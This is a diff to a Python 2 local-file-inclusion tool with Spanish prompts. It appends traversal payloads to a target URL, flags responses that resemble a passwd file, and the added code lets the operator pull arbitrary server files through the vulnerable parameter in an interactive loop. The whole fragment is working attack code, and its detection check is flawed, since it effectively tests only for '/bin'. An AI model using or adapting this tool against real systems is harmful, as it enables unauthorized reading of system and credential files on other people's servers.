@@ -16,7 +16,19 @@ def main():
             query = requests.get(parser.target+p)
             if 'root' and 'bash' and '/bin' in query.text:
                 print("Probable LFI: {}".format(parser.target+p))
-                print("\n=============================")
+                b= BeautifulSoup(query.text,'html5lib')
+                print(b.blockquote.text)
+                op = raw_input("Desea consultar archivos?: s/n: ")
+                if op.lower() == "s":
+                    while True:
+                        files = raw_input("Archivos: ")
+                        qf = requests.get(parser.target+files)
+                        if not "Warning" in qf.text:
+                            bf = BeautifulSoup(qf.text,'html5lib')
+                            print(bf.blockquote.text)
+                        else:
+                            print("Fallo en la consulta del archivo")
+            print("\n=============================")
     else:
         print("Especifique el objetivo")
 
